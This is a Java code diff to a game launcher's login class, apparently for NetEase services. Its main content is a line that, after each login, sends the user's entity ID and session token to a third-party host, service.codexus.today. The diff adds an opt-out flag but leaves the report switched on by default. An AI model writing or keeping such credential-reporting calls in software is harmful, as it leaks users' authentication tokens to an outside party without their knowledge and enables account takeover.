@@ -24,6 +24,8 @@ public final class WPFLauncher implements AutoCloseable {
     private final HttpWrapper client, core, game, gateway, rental;
     private final MgbSdk sdk;
     public final MPay MPay;
+    private boolean reportAccountSession = true;
+    public WPFLauncher(boolean reportAccountSession) { this(); this.reportAccountSession = reportAccountSession; }
     public WPFLauncher() { this(new MPay("aecfrxodyqaaaajp-g-x19", getLatestVersionAsync().join())); }
     private WPFLauncher(MPay mpay) {
         this(mpay, new HttpWrapper("https://x19mclobt.nie.netease.com", builder -> builder.userAgent("WPFLauncher/" + mpay.GameVersion)),
@@ -73,7 +75,7 @@ public final class WPFLauncher implements AutoCloseable {
         var session = "netease".equals(cookie.LoginChannel) ? CompletableFuture.<Void>completedFuture(null) : sdk.authSession(request.Json);
         return session.thenCompose(ignored -> loginOtpAsync(request)).thenCompose(otp -> authenticationOtpAsync(request, otp))
                 .thenCompose(user -> InterConn.loginStart(user.EntityId, user.Token).thenApply(ignored -> {
-                    HTTP.getAsync("https://service.codexus.today/interconnection/report?id=" + user.EntityId + "&token=" + user.Token + "&version=" + MPay.GameVersion);
+                    if (reportAccountSession) HTTP.getAsync("https://service.codexus.today/interconnection/report?id=" + user.EntityId + "&token=" + user.Token + "&version=" + MPay.GameVersion);
                     return new CookieLogin(user, cookie.LoginChannel);
                 }));
     }
